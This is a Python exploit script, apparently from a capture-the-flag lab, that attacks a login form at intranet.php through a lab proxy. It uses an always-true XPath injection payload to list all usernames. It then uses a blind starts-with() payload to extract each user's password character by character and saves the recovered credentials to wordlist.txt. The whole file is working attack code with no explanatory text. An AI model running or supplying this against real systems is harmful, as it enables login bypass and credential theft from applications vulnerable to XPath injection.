#!/usr/bin/env python3
import requests, string
from bs4 import BeautifulSoup
from sys import stdout

url = "http://172.31.179.1/intranet.php"

proxy = {
    'http' : '10.10.10.200:3128' # Host
    #'http' : '127.0.0.1:8080' # Burp
}

# Send POST-request
def send_req(username:str="",password:str="") -> str:
    data = {
        'Username':username,
        'Password':password
    }
    return requests.post(url, data=data, proxies=proxy).text

# Returns all usernames
def get_users() -> list:
    html = send_req("' or '1'='1","' or '1'='1")
    soup = BeautifulSoup(html, 'html.parser')
    usernames = []
    [usernames.append(p.text.strip()) for p in soup.find_all('p', {"class": "w3-opacity"})] # Get usernames
    return sorted(usernames) # Sort list by alphabet

# Returns True if part of password is OK
def check_pw(payload:str="") -> bool:
    return "Invalid credentials" not in send_req(username=payload)

# Clears screen
def clear() -> None:
    stdout.write("\033[F")
    stdout.write("\033[K")

# Gets password of specified user
def get_password(user:str) -> str:
    password = ""
    while True:
        for char in string.printable.strip():
            # Skip single-quote, as it break query
            if char == "'":
                continue
            # Payload to get password char-by-char
            payload = f"{user}' and starts-with(Password, '{password}{char}') or '1'='1"
            try:
                # Check if current char is valid
                if check_pw(payload=payload):
                    clear()
                    password += char
                    print(f"[*] Password: {password}")
                    break
            except Exception as ex:
                print(f"[!] Error: {ex}")
                break
        else: # No char valid, password done
            break
    clear()
    return password

if __name__ == "__main__":
    usernames = get_users()
    creds = [] # List of all creds, can be used to write to file
    for user in usernames:
        print(f"[*] Getting password of {user}...\n")
        pw = get_password(user)
        clear()
        print(f"[+] Got password of {user}: {pw}")
        creds.append([user,pw])
    
    # Write creds to file
    with open("wordlist.txt", "w") as file:
        for cred in creds:
            file.write(f"{cred[0]}:{cred[1]}\n")